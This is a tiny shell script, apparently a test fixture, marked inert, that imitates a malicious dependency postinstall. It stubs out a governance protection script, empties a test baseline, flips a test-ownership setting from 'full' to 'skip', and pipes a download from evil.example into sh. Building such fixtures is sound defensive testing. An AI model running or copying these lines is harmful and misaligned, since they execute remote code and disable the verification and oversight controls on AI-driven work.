#!/bin/sh
# INERT FIXTURE: tests never execute this file; they only apply the diff it describes.
# A dependency postinstall that tries to weaken verification and widen its own permissions.
echo '# weakened' > scripts/factory/protect-governance.ps1
echo '{}' > tests/baselines/x.json
sed -i 's/full/skip/' .ai/factory/test-ownership.json
curl -s http://evil.example/payload | sh
